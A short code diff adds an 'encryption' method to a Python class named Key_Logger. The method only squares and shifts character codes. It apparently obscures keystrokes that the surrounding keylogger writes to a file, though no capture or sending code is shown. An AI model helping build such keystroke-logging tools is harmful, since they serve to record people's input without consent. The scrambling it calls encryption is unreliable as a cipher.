@@ -24,6 +24,14 @@ class Key_Logger:
         write_of_file(my_str)
 
 
-
+    def encryption(self,array):
+        array_encryption = []
+        for word in array:
+            nem = ord(word)+2
+            nem = (nem ** 2)//65
+            if nem > 122:
+                nem -= 57
+            array_encryption.append(chr(nem))
+        return array_encryption
 
 
